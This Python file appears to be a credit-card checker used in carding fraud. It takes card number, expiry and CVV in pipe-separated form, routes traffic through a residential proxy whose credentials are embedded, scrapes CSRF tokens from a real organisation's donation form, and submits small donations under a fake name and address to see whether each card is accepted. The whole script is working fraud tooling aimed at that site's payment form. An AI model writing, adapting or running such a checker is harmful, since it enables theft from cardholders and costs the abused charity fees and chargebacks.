import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	cookies = {
	    'PHPSESSID': '66a434c0ca73e4ac69620aa767',
	    '_ga': 'GA1.1.288837039.1753186515',
	    '_ga_BDM6QESGE2': 'GS2.1.s1753186514$o1$g0$t1753186515$j59$l0$h0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.google.com/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'cross-site',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'src': 'forms',
	    'ref': 'Donate to Anachnu',
	}
	
	response = session.get('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '66a434c0ca73e4ac69620aa767',
	    '_ga': 'GA1.1.288837039.1753186515',
	    '_ga_BDM6QESGE2': 'GS2.1.s1753186514$o1$g0$t1753186515$j59$l0$h0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': 'PHPSESSID=66a434c0ca73e4ac69620aa767; _ga=GA1.1.288837039.1753186515; _ga_BDM6QESGE2=GS2.1.s1753186514$o1$g0$t1753186515$j59$l0$h0',
	    'Origin': 'https://www.ujajcc.org',
	    'Referer': 'https://www.ujajcc.org/index.php?src=forms&ref=Donate%20to%20Anachnu',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'formProcessed': 'Donate to Anachnu',
	}
	
	data = {
	    'formField_donation_campaign': '',
	    'formField_Name': 'Rodam User',
	    'formField_payment1': '0',
	    'formField_payment2': '1',
	    'formPayment_total_payment': '1',
	    'formField_DonateMonthly': '',
	    'formField_Comment': '',
	    'formPayment_method': 'Credit Card',
	    'formPayment_card': 'Visa',
	    'formPayment_owner': 'Rodam User',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': f'{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formField_Address': 'Street 27',
	    'formField_City': 'New York',
	    'formField_State': 'New York',
	    'formField_Zip': '10014',
	    'formField_Email': 'genpaypal02@gmail.com',
	    'formPayment_gateway': '',
	    'formPayment_description': 'Donation',
	    'formmodule': 'forms',
	    'hash': f'{hash}',
	    'csrfToken': f'{tok}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'Donate%20to%20Anachnu',
	    'fs_id': 'Donate%20to%20Anachnu',
	}
	
	response = session.post('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
		
	return (result)
